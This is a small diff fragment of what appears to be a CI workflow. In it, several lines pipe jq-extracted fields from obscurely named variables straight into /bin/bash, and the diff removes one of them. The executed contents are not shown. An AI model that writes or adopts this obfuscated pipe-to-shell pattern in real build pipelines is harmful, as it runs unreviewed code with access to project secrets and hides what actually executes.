@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$zkdr90" | jq -r .ffc912 | /bin/bash
           echo $qt92 | jq -r .gpix459 | /bin/bash
           echo $wx2 | jq -r .ydmmp04010 | /bin/bash
-          printf '%s' "$betiq22459" | jq -r .qlv13566 | /bin/bash
           echo $dr91332 | jq -r .iiz935 | /bin/bash
           echo $fmyee4 | jq -r .mxrox6 | /bin/bash
 
